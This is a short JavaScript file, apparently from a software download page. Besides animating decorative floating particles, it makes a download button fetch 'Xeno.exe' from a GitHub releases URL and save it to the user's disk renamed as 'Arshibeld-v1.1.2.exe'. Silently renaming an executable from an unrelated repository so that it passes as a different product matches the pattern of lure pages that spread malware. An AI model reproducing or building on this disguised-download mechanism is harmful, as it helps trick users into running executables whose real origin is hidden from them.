// Script pour le téléchargement du fichier
document.addEventListener('DOMContentLoaded', function() {
    // Sélectionner le bouton de téléchargement
    const downloadBtn = document.querySelector('.download-btn');
    
    // Ajouter un événement de clic au bouton
    downloadBtn.addEventListener('click', function(e) {
        // URL du fichier à télécharger
        const fileUrl = 'https://github.com/demon1GH/Tool-Downloads/releases/download/Tool/Xeno.exe';
        // Nom du fichier à télécharger
        const fileName = 'Arshibeld-v1.1.2.exe';
        
        // Créer un élément <a> temporaire
        const link = document.createElement('a');
        link.href = fileUrl;
        link.download = fileName;
        
        // Ajouter le lien au document, cliquer dessus, puis le supprimer
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    });
    
    // Créer les particules flottantes (code existant)
    const particlesContainer = document.querySelector('.floating-particles');
    const numberOfParticles = 25;
    
    for (let i = 0; i < numberOfParticles; i++) {
        const particle = document.createElement('div');
        particle.classList.add('particle');
        
        // Random positioning
        const posX = Math.random() * 100;
        const posY = Math.random() * 100 + 100; // Start below viewport
        particle.style.left = `${posX}%`;
        particle.style.top = `${posY}%`;
        
        // Random size
        const size = Math.random() * 5 + 2;
        particle.style.width = `${size}px`;
        particle.style.height = `${size}px`;
        
        // Random opacity
        particle.style.opacity = Math.random() * 0.3 + 0.1;
        
        // Random animation duration
        const duration = Math.random() * 30 + 15;
        particle.style.animationDuration = `${duration}s`;
        
        particlesContainer.appendChild(particle);
    }
});
